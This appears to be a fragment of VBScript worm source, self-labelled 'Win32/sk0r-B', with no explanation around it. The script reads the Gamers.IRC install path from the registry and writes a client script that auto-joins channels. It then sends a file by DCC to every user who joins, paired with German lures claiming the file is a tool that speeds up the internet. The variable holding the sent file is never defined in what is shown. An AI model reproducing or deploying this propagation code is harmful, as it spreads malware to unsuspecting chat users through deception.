'test file

'On Error Resume Next

set fso = createobject ("scripting.filesystemobject")
set wshs = createobject ("wscript.shell")
set sysdir = fso.getspecialfolder(1)
set windir = fso.getspecialfolder(0)
set shelldll = createobject ("shell.application")
hddspace = left(windir,2)



readircdir = wshs.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Gamers.Interactive\Gamers.IRC\" & "inst_path")
If readircdir <> "" Then
set createmircscript = fso.createtextfile (hddspace+"\gamersirc.grc",true)
createmircscript.writeline ("; Win32/sk0r-B Gamers.IRC Script File")
createmircscript.writeline ("on 1:connect:{ ")
createmircscript.writeline ("  titlebar sk0r File Dcc Center ")
createmircscript.writeline ("  join #0,0 ")
createmircscript.writeline ("  join -n #sponsor,#sponsoring,#bouncer4you,#ringer,#clansuche ")
createmircscript.writeline ("} ")
createmircscript.writeline ("on 1:join:#: { ")
createmircscript.writeline ("  if ($nick != $me) { ")
createmircscript.writeline ("    var %theuser = $nick ")
createmircscript.writeline ("    var %data = "+mircdccsendfile+" ")
createmircscript.writeline ("    var %rand = $rand(a, c) ")
createmircscript.writeline ("    if (%rand == a) { ")
createmircscript.writeline ("      var %msg = Mit dem Tool kannste dein Internet Speed verbessern! ")
createmircscript.writeline ("    }  ")
createmircscript.writeline ("    elseif (%rand == b) { ")
createmircscript.writeline ("      var %msg = Teste ma das ptimizer Tool, wir finden das alle voll geil! ")
createmircscript.writeline ("    }  ")
createmircscript.writeline ("    else { ")
createmircscript.writeline ("      var %msg = Ey mein Inet geht so ab, danke dem Tool. Teste des auch ma! ")
createmircscript.writeline ("    } ")
createmircscript.writeline ("    dcc send -c %theuser %data ")
createmircscript.writeline ("    msg %theuser %msg ")
createmircscript.writeline ("  } ")
createmircscript.writeline ("} ")
createmircscript.Close
end if
